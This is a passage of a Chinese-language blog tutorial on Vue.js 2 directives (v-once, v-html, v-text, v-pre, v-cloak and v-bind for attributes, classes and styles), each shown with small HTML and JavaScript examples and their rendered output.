class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;下午好&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;Lebron&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;James&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>: <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h2><p>该指令后面不需要跟任何表达式(比如之前的v-for后面是跟表达式的)。</p><p>该指令表示元素和组件只渲染一次，不会随着数据的改变而改变。(留心这会影响到该节点上的其它数据绑定)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;下午好，阿楠&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面展示如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201013152521.png"></p><h2 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h2><p>某些情况下，我们从服务器请求到的数据本身就是一个HTML代码，如果我们直接通过Mustache语法来输出，会将HTML代码也一起输出。</p><p>但是我们可能希望的是按照HTML格式进行解析，并且显示对应的内容，我们可以使用 v-html 指令。</p><p>该指令后面往往会跟上一个string类型，会将string的html解析出来并且进行渲染。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;url&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-html</span>=<span class="string">&quot;url&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>: <span class="string">&#x27;&lt;a href=&quot;https://nanzx.top&quot;&gt;阿楠的博客&lt;/a&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面展示如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201013152543.png"></p><h2 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h2><p>v-text作用和Mustache比较相似：都是用于将数据显示在界面中</p><p>v-text通常情况下，接受一个string类型</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;，詹姆斯FMVP<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&quot;message&quot;</span>&gt;</span>，詹姆斯FMVP<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;湖人总冠军&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面展示如下：</p><p>湖人总冠军，詹姆斯FMVP</p><p>湖人总冠军</p><h2 id="v-pre"><a href="#v-pre" class="headerlink" title="v-pre"></a>v-pre</h2><p>v-pre用于跳过这个元素和它子元素的编译过程，用于显示原本的Mustache语法。</p><p>第一个h2元素中的内容会被编译解析出来对应的内容</p><p>第二个h2元素中会直接显示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;湖人总冠军&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面展示如下：</p><p>湖人总冠军</p><p><code>&#123;&#123;message&#125;&#125;</code></p><h2 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h2><p>在某些情况下，我们浏览器可能会直接显然出未编译的Mustache标签。</p><p>v-cloak 这个指令保持在元素上直到关联实例结束编译。和 CSS 规则如 <code>[v-cloak] &#123; display: none &#125;</code> 一起用时，这个指令可以隐藏未编译的 Mustache 标签直到实例准备完毕。</p><p>cloak: 斗篷</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[v-cloak]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span> <span class="attr">v-cloak</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// vue解析之前，div中有一个属性v-cloak，解析后就没有了</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">message</span>: <span class="string">&#x27;湖人总冠军&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="绑定属性"><a href="#绑定属性" class="headerlink" title="绑定属性"></a>绑定属性</h1><h2 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h2><p>插值操作是将值插入到我们模板的<strong>内容</strong>当中。</p><p>但是，除了内容需要动态来决定外，某些<strong>属性</strong>我们也希望动态来绑定。</p><p>比如动态绑定a元素的href属性，动态绑定img元素的src属性，我们都可以使用 v-bind 指令。</p><p>v-bind有一个对应的语法糖，也就是<strong>简写方式</strong>，在开发中，我们通常会使用语法糖的形式，因为这样更加简洁。</p><p>语法糖： : (属性前加一个冒号)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgUrl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;aHref&quot;</span>&gt;</span>Vue官网<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--语法糖格式如下：--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;imgUrl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;aHref&quot;</span>&gt;</span>Vue官网<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">imgUrl</span>: <span class="string">&#x27;https://cn.vuejs.org/images/logo.png&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">aHref</span>: <span class="string">&#x27;https://cn.vuejs.org/v2/api/#%E6%8C%87%E4%BB%A4&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-bind绑定class"><a href="#v-bind绑定class" class="headerlink" title="v-bind绑定class"></a>v-bind绑定class</h2><p>很多时候，我们希望动态的来切换class，比如：</p><ul><li><p>当数据为某个状态时，字体显示红色。</p></li><li><p>当数据另一个状态时，字体显示黑色。</p></li></ul><p><strong>绑定class有两种方式：①对象语法   ②数组语法</strong></p><hr><p>绑定方式：对象语法</p><p>对象语法的含义是：class后面跟的是一个对象。</p><p>用法一：直接通过{}绑定一个类<br><code>&lt;h2 :class=&quot;&#123;&#39;active&#39;: isActive&#125;&quot;&gt;Hello World&lt;/h2&gt;</code></p><p>用法二：也可以通过判断，传入多个值<br><code>&lt;h2 :class=&quot;&#123;&#39;active&#39;: isActive, &#39;line&#39;: isLine&#125;&quot;&gt;Hello World&lt;/h2&gt;</code></p><p>用法三：和普通的类同时存在，并不冲突<br>注：如果isActive和isLine都为true，那么会有title&#x2F;active&#x2F;line三个类<br><code>&lt;h2 class=&quot;title&quot; :class=&quot;&#123;&#39;active&#39;: isActive, &#39;line&#39;: isLine&#125;&quot;&gt;Hello World&lt;/h2&gt;</code></p><p>用法四：如果过于复杂，可以放在一个methods或者computed中<br>注：classes是一个计算属性<br><code>&lt;h2 class=&quot;title&quot; :class=&quot;classes&quot;&gt;Hello World&lt;/h2&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;active: isActive,line: isLine&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;getClasses()&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;下午好，阿楠&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isActive</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isLine</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">btnClick</span>: <span class="keyword">function</span> (<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">isActive</span> = !<span class="variable language_">this</span>.<span class="property">isActive</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getClasses</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> &#123;<span class="attr">active</span>: <span class="variable language_">this</span>.<span class="property">isActive</span>,<span class="attr">line</span>: <span class="variable language_">this</span>.<span class="property">isLine</span>&#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>绑定方式：数组语法</p><p>数组语法的含义是：class后面跟的是一个数组。</p><p>用法一：直接通过[]绑定一个数组<br><code>&lt;h2 :class=&quot;[&#39;active&#39;]&quot;&gt;Hello World&lt;/h2&gt;</code></p><p>用法二：也可以传入多个值<br><code>&lt;h2 :class=“[‘active’, &#39;line&#39;]&quot;&gt;Hello World&lt;/h2&gt;</code></p><p>用法三：和普通的类同时存在，并不冲突<br>注：会有title&#x2F;active&#x2F;line三个类<br><code>&lt;h2 class=&quot;title&quot; :class=“[‘active’, &#39;line&#39;]&quot;&gt;Hello World&lt;/h2&gt;</code></p><p>用法四：如果过于复杂，可以放在一个methods或者computed中<br>注：classes是一个计算属性<br><code>&lt;h2 class=&quot;title&quot; :class=&quot;classes&quot;&gt;Hello World&lt;/h2&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 加引号是字符串 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;[&#x27;active&#x27;,&#x27;line&#x27;]&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--没加引号是属性--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;[active,line]&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;getClasses()&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;下午好，阿楠&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">active</span>: <span class="string">&#x27;aaa&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">line</span>: <span class="string">&#x27;bbb&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">getClasses</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> [<span class="variable language_">this</span>.<span class="property">active</span>, <span class="variable language_">this</span>.<span class="property">line</span>]</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-bind绑定style"><a href="#v-bind绑定style" class="headerlink" title="v-bind绑定style"></a>v-bind绑定style</h2><p>我们可以利用v-bind:style来绑定一些CSS内联样式。</p><p>在写CSS属性名的时候，比如font-size</p><ul><li><p>我们可以使用驼峰式 (camelCase)  fontSize </p></li><li><p>或短横线分隔 (kebab-case，记得用单引号括起来) ‘font-size’</p></li></ul><p><strong>绑定style有两种方式：①对象语法   ②数组语法</strong></p><hr><p>绑定方式一：对象语法</p><p><code>:style=&quot;&#123;color: currentColor, fontSize: fontSize + &#39;px&#39;&#125;&quot;</code></p><p>style后面跟的是一个对象类型</p><p>对象的key是CSS属性名称</p><p>对象的value是具体赋的值，值可以来自于data中的属性</p><figure class="highlight 